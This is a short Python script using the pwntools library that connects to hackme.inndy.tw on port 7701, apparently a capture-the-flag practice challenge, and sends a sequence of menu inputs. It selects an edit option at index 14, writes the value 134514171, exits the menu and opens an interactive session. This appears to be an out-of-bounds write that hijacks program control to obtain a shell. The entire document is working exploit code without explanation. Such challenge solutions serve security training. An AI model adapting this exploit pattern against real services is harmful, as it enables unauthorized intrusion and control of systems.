from pwn import *

a=remote("hackme.inndy.tw",7701)

a.recvuntil("What's your name? ")
a.sendline("a")
a.recvuntil("\n > ")
a.sendline("1")
a.recvuntil("Index to edit: ")
a.sendline("14")
a.recvuntil("How many? ")
a.sendline("134514171")
a.recvuntil("\n > ")
a.sendline("0")
a.interactive()
